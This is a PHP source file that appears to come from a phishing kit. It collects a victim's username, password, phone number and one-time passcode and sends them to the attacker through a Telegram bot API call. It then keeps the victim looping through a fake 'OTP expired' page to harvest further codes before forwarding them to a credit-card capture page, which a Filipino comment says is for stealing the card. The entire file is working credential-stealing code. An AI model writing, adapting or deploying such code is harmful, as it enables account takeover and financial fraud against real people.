<?php
include("config.php");

$data = [
'chat_id' => $chat_id,
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
];

file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

@session_start();

if (isset($_SESSION['first_visit'])) {
   if (isset($_SESSION['second_visit'])) {
      if (isset($_SESSION['third_visit'])) {
         header("Location: cc.php"); // this is four visit bago mapadpad sa pag nakaw ng cc
      }
      else {
         $_SESSION['third_visit'] = "Third Visit";
         header("Location: otp-expired.php");
      }
   }
   else {
      $_SESSION['second_visit'] = "Second Visit";
      header("Location: otp-expired.php");
   }
}
else {
   $_SESSION['first_visit'] = "First Visit";
   header("Location: otp-expired.php");
}
//header("Location: otp-expired.php");
?>
